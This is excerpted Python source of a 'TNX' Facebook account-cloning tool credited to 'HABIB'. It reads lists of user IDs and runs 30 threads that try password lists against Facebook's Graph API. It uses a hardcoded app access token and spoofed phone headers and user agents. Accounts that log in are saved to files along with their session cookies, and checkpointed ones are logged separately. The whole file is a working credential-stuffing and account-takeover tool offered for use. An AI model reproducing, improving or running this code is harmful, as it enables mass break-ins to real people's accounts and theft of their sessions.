...
##------------(LOGO)------------##  
logo=(f"""{A}
      {A}88888888888 888b    888 Y88b   d88P 
      {G}    888     8888b   888  Y88b d88P  
      {A}    888     88888b  888   Y88o88P   
      {G}    888     888Y88b 888    Y888P    
      {G}    888     888 Y88b888    d888b    
      {A}    888     888  Y88888   d88888b   
      {G}    888     888   Y8888  d88P Y88b  
      {A}    888     888    Y888 d88P   Y88b
{R}--------------------------------------------------
{R}❲{G}~{R}❳{G} DEVELOPER {R}:{G} HABIB_🖤🖤
{R}❲{G}~{R}❳{G} VERSION   {R}:{G} 1.1
{R}--------------------------------------------------""")
...
def Main_TNX():
        ...
        if opt1 == "1": file()   
            ...
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_TNX()
            if d == '0':Main_TNX()
            else:linex();print(f'{R}❲{G}~{R}❳{G}  Selected Wrong Option ');time.sleep(2);Main_TNX()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}TNX.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    with tred(max_workers=30) as TNX:
        clear()
        tl = str(len(fo))
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                TNX.submit(api1,ids,names,passlist)
            elif methd =='2':
                TNX.submit(api2,ids,names,passlist)
            else:
                TNX.submit(api1,ids,names,passlist)
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/TNX_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    os.system('python Main_TNX.py')
...
def omi():
	...
	fbdv = random.choice(["CPH2493", "CPH2423", "CPH2423", "CPH2493", "CPH2423", "CPH2399", "CPH2423", "CPH2423", "CPH2487", "CPH2423", "CPH2487", "OnePlus Nord", "CPH2493", "CPH2411", "CPH2465", "CPH2423", "CPH2469", "CPH2469", "CPH2469", "vivo 1904", "vivo 1904", "vivo 1904", "oppo6779", "A201OP", "OPPO A37t", "CPH2185"])
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}TNX-XD{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                head = {'User-Agent':omi(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                ...
                if 'session_key' in po:
                        ...
                        print(f'\r{R}❲{G}TNX-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'TNX-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'TNX-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}TNX-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'TNX-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}TNX-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}❲{G}TNX-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'TNX-FILE-M1-OK.txt')
                    open('/sdcard/TNX/TNX-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}TNX-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'TNX-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}TNX-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}TNX-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    print(f"{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'TNX-FILE-M2-OK.txt')
                    open('/sdcard/TNX/TNX-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}TNX-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'TNX-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
